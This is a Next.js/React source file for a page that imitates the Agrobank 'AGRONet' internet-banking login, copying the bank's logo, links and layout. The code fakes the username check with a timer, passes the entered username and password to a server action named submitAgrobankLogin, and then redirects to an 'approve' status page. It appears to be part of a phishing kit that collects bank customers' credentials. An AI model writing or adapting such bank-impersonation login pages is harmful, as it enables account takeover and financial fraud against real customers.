"use client";

import React, { useState, useEffect } from "react";
import Image from "next/image";
import { Loader2 } from "lucide-react";
import { submitAgrobankLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function AgrobankLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [currentTime, setCurrentTime] = useState("");
  const router = useRouter();

  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      const options: Intl.DateTimeFormatOptions = {
        weekday: 'long',
        day: 'numeric',
        month: 'long',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
      };
      setCurrentTime(now.toLocaleString('en-GB', options).replace(',', ''));
    };

    updateTime();
    const interval = setInterval(updateTime, 1000);
    return () => clearInterval(interval);
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (step === 1) {
      if (username.length < 3) {
        setError("Please enter a valid username.");
        return;
      }
      setIsLoading(true);
      setError("");
      // Simulate checking username
      setTimeout(() => {
        setIsLoading(false);
        setStep(2);
      }, 1000);
      return;
    }

    if (step === 2) {
      if (password.length < 6) {
        setError("Please enter a valid password.");
        return;
      }

      setIsLoading(true);
      setError("");

      try {
        const result = await submitAgrobankLogin(username, password);
        if (result.success) {
          setTimeout(() => {
            router.push("/b/status/approve");
          }, 1500);
        } else {
          setError(result.error || "Login failed. Please try again.");
          setIsLoading(false);
        }
      } catch (err) {
        setError("Something went wrong. Please try again later.");
        setIsLoading(false);
      }
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white font-sans text-[#333]">
      {/* Top Header Links */}
      <header className="flex items-center justify-center gap-4 py-6 text-[13px] font-medium text-[#E31E24]">
        <button className="hover:underline">Contact</button>
        <span className="text-gray-300">|</span>
        <button className="hover:underline">Caution</button>
        <span className="text-gray-300">|</span>
        <button className="hover:underline">Security Tips</button>
      </header>

      {/* Main Container */}
      <main className="flex flex-1 flex-col items-center px-6 py-4">
        {/* Timestamp */}
        <div className="mb-8 text-center text-[13px] text-gray-600">
          {currentTime || "Monday, 21 December 2020 15:38:05"}
        </div>

        {/* Logo */}
        <div className="mb-6 flex justify-center">
          <Image
            src="/bank/Agrobank_Logo.svg"
            alt="Agrobank Logo"
            width={240}
            height={60}
            className="h-16 w-auto"
          />
        </div>

        {/* Heading */}
        <h2 className="mb-10 text-center text-2xl font-medium tracking-tight">
          Welcome To <span className="text-[#E31E24]">AGRONet</span>
        </h2>

        {/* Form */}
        <form onSubmit={handleLogin} className="w-full max-w-sm space-y-4">
          {error && (
            <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
              {error}
            </div>
          )}

          <div className="relative">
            {step === 1 ? (
              <input
                type="text"
                placeholder="Enter your username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full rounded border border-gray-300 bg-white px-4 py-3.5 text-base text-gray-700 placeholder:text-gray-400 outline-none transition-all focus:border-[#E31E24]"
                required
                autoFocus
              />
            ) : (
              <div className="space-y-4">
                <div className="bg-gray-50 p-3 rounded border border-gray-200 text-sm text-gray-600">
                  Username: <span className="font-bold">{username}</span>
                </div>
                <input
                  type="password"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded border border-gray-300 bg-white px-4 py-3.5 text-base text-gray-700 placeholder:text-gray-400 outline-none transition-all focus:border-[#E31E24]"
                  required
                  autoFocus
                />
              </div>
            )}
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="flex w-full items-center justify-center rounded-lg bg-[#E31E24] py-3 text-[17px] font-bold text-white shadow-sm transition-all active:scale-[0.98] disabled:opacity-80"
          >
            {isLoading ? (
              <Loader2 className="h-5 w-5 animate-spin" />
            ) : (
              "Login"
            )}
          </button>

          <button
            type="button"
            onClick={() => step === 2 ? setStep(1) : undefined}
            className="flex w-full items-center justify-center rounded-lg bg-[#D1D3D4] py-3 text-[17px] font-bold text-[#555] shadow-sm transition-all active:scale-[0.98]"
          >
            {step === 2 ? "Back" : "Cancel"}
          </button>
        </form>

        {/* Footer Navigation */}
        <div className="mt-16 w-full max-w-md border-t border-gray-100 pt-8">
          <div className="flex flex-wrap justify-center gap-x-3 gap-y-2 text-[11px] font-medium text-gray-500">
            <button className="hover:text-[#E31E24]">Client Charter</button>
            <span className="text-gray-200">|</span>
            <button className="hover:text-[#E31E24]">Privacy Policy</button>
            <span className="text-gray-200">|</span>
            <button className="hover:text-[#E31E24]">Security Policy</button>
          </div>
          <div className="mt-4 flex flex-wrap justify-center gap-x-3 gap-y-2 text-[11px] font-medium text-gray-500">
            <button className="hover:text-[#E31E24]">Terms & Conditions</button>
            <span className="text-gray-200">|</span>
            <button className="hover:text-[#E31E24]">Contact Us</button>
            <span className="text-gray-200">|</span>
            <button className="hover:text-[#E31E24]">Site Map</button>
          </div>
        </div>
      </main>

      {/* Decorative Side Shadows (Simulated from image) */}
      <div className="fixed inset-y-0 left-0 w-4 bg-gradient-to-r from-gray-100/50 to-transparent pointer-events-none" />
      <div className="fixed inset-y-0 right-0 w-4 bg-gradient-to-l from-gray-100/50 to-transparent pointer-events-none" />
    </div>
  );
}
